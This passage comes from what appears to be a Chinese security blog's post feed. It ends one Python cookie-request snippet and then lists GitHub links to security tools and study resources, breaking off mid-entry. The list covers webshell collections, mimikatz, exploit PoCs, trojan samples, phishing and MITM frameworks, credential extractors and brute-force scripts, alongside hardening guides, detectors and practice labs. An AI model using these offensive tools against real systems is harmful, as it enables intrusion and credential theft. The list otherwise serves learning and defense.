class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">,</span>cookie<span class="token punctuation">)</span>data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全行业小工具以及学习资源收集</title>
      <link href="/2019/04/12/web-an-quan-xue-xi-zi-liao-suo-yin/"/>
      <url>/2019/04/12/web-an-quan-xue-xi-zi-liao-suo-yin/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>安全行业小工具以及学习资源收集项目，此项目部分内容来自：<a href="https://www.t00ls.net/thread-38964-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-38964-1-1.html</a><br>感谢其分享，这里只是作为个人备份，如有问题可邮件通知。</p><h2 id="安全资源"><a href="#安全资源" class="headerlink" title="安全资源"></a>安全资源</h2><p>安全资源包括安全书籍，资料，安全教程，学习平台等等。</p><h3 id="设备基线加固资料"><a href="#设备基线加固资料" class="headerlink" title="设备基线加固资料"></a>设备基线加固资料</h3><p><a href="https://github.com/re4lity/Benchmarks" target="_blank" rel="noopener">https://github.com/re4lity/Benchmarks</a></p><p><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">https://learn.cisecurity.org/benchmarks</a></p><p><a href="https://nvd.nist.gov/ncp/repository" target="_blank" rel="noopener">https://nvd.nist.gov/ncp/repository</a></p><h3 id="内网渗透学习资料"><a href="#内网渗透学习资料" class="headerlink" title="内网渗透学习资料"></a>内网渗透学习资料</h3><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h3 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h3><p><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><h3 id="安全脑图"><a href="#安全脑图" class="headerlink" title="安全脑图"></a>安全脑图</h3><p><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><h3 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h3><p>开源漏洞靶场</p><p><a href="https://github.com/phith0n/vulhub" target="_blank" rel="noopener">https://github.com/phith0n/vulhub</a></p><p>WebGoat漏洞练习环境</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>Damn Vulnerable Web Application(漏洞练习平台)</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><h2 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h2><p>安全工具包括：扫描器,漏洞利用工具,信息收集工具等等</p><h3 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h3><p>端口扫描器Nmap</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>漏洞路由扫描器</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h3><p>社工插件，可查找以email、phone、username的注册的所有网站账号信息</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><h3 id="WEB工具"><a href="#WEB工具" class="headerlink" title="WEB工具"></a>WEB工具</h3><p>webshell大合集</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack_tools_for_me</a></p><p>XSS数据接收平台</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>Short for command injection exploiter，web向命令注入检测工具</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理，通过加载sqlmap api进行sqli实时检测</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>.git泄露利用EXP</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>一款开源WAF</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><h3 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h3><p>windows渗透神器</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h3 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h3><p>msf</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h3 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h3><p>ExploitDB官方git版本</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>Simple test for CVE-2016-2107</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权)</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h3 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h3><p>中间人攻击框架</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>可扩展的中间人代理工具</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>密码破解工具</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h3 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h3><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）</p><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h3 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h3><p>二进制EXP编写工具</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><h3 id="隐写相关工具"><a href="#隐写相关工具" class="headerlink" title="隐写相关工具"></a>隐写相关工具</h3><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h3 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料"></a>各类安全资料</h3><p>域渗透教程</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><p>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="noopener">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></p><p><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="noopener">https://github.com/smartFlash/pySecurity</a></p><p>data_hacking合集</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>ctf及黑客资源合集</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>《DO NOT FUCK WITH A HACKER》</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><h3 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h3><p>近年ctf writeup大全</p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><h3 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h3><p>大礼包（什么都有）</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project-analysis</a></p><p>python框架，库，资源大合集</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>python 正则表达式库（用于简化构造复杂的python正则表达式）</p><p><a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/PythonVerbalExpressions</a></p><p>python任务管理以及命令执行库</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>py3 爬虫框架</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><h3 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h3><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p><h3 id="老司机福利"><a href="#老司机福利" class="headerlink" title="老司机福利"></a>老司机福利</h3><p>微信自动抢红包动态库</p><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>神器</p><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h3 id="以下内容来自：https-github-com-We5ter-Scanners-Box-blob-master-README-CN-md"><a href="#以下内容来自：https-github-com-We5ter-Scanners-Box-blob-master-README-CN-md" class="headerlink" title="以下内容来自：https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md"></a>以下内容来自：<a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a></h3><p>子域名枚举类</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a> (经典的子域名爆破枚举脚本)</p><p><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a> (子域名字典穷举)</p><p><a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a> (子域名枚举与地图标记)</p><p><a href="https://github.com/0xbug/orangescan" target="_blank" rel="noopener">https://github.com/0xbug/orangescan</a> (在线子域名信息收集工具)</p><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a> （根据DNS记录查询子域名)</p><p><a href="https://github.com/We5ter/GoogleSSLdomainFinder" target="_blank" rel="noopener">https://github.com/We5ter/GoogleSSLdomainFinder</a> (基于谷歌SSL透明证书的子域名查询脚本)</p><p><a href="https://github.com/mandatoryprogrammer/cloudflare_enum" target="_blank" rel="noopener">https://github.com/mandatoryprogrammer/cloudflare_enum</a> （使用CloudFlare进行子域名枚举的脚本）</p><p><a href="https://github.com/18F/domain-scan" target="_blank" rel="noopener">https://github.com/18F/domain-scan</a> (A domain scanner）</p><p><a href="https://github.com/Evi1CLAY/Cool" target="_blank" rel="noopener">https://github.com/Evi1CLAY/Cool</a> … Python/DomainSeeker（多方式收集目标子域名信息）</p><p>数据库漏洞扫描类</p><p><a href="https://github.com/0xbug/SQLiScanner" target="_blank" rel="noopener">https://github.com/0xbug/SQLiScanner</a> (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</p><p><a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">https://github.com/stamparm/DSSS</a> (99行代码实现的sql注入漏洞扫描器)</p><p><a href="https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）" target="_blank" rel="noopener">https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）</a></p><p><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a> (一款针对mongoDB的攻击工具)</p><p><a href="https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）" target="_blank" rel="noopener">https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）</a></p><p><a href="https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）</a></p><p>弱口令或信息泄漏扫描类</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a> (一个简单的HTTP暴力破解、撞库攻击脚本)</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> (一个迷你的信息泄漏批量扫描脚本)</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a> (.git文件夹泄漏利用工具)</p><p><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a> (端口及弱口令检测)</p><p><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">https://github.com/ysrc/F-Scrack</a> (对各类服务进行弱口令检测的脚本)</p><p><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a> （根据用户习惯生成弱口令探测字典脚本）</p><p><a href="https://github.com/RicterZ/genpAss" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss</a> （中国特色的弱口令生成器）</p><p><a href="https://github.com/netxfly/crack_ssh" target="_blank" rel="noopener">https://github.com/netxfly/crack_ssh</a> （go写的协程版的ssh\redis\mongodb弱口令破解工具）</p><p>物联网设备扫描</p><p><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a> （物联网设备默认密码扫描检测工具)</p><p><a href="https://github.com/shodan-labs/iotdb" target="_blank" rel="noopener">https://github.com/shodan-labs/iotdb</a> (使用nmap扫描IoT设备)</p><p>xss扫描器</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a> （Cross-Site Scripting Bruteforcer）</p><p><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> (A small python script to check for Cross-Site Tracing)</p><p><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</p><p><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> (批量扫描xss的python脚本）</p><p>企业网络自检</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a> （详细的内部网络信息扫描器）</p><p><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a> (网络资产识别引擎，漏洞检测引擎）</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a> (javascript实现的本地网络扫描器)</p><p><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</p><p><a href="https://github.com/x0day/Multisearch-v2" target="_blank" rel="noopener">https://github.com/x0day/Multisearch-v2</a> (bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</p><p>webshell检测</p><p><a href="https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/</a> （php后门检测，脚本较简单，因此存在误报高和效率低下的问题）</p><p><a href="https://github.com/yassineaddi/BackdoorMan" target="_blank" rel="noopener">https://github.com/yassineaddi/BackdoorMan</a> （A toolkit find malicious, hidden and suspicious PHP scripts and shells in a chosen destination）</p><p>内网渗透</p><p><a href="https://github.com/0xwindows/VulScritp" target="_blank" rel="noopener">https://github.com/0xwindows/VulScritp</a> （企业内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等）</p><p><a href="https://github.com/lcatro/network_backdoor_scanner（基于网络流量的内网探测框架）" target="_blank" rel="noopener">https://github.com/lcatro/network_backdoor_scanner（基于网络流量的内网探测框架）</a></p><p><a href="https://github.com/fdiskyou/hunter（调用" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter（调用</a> Windows API 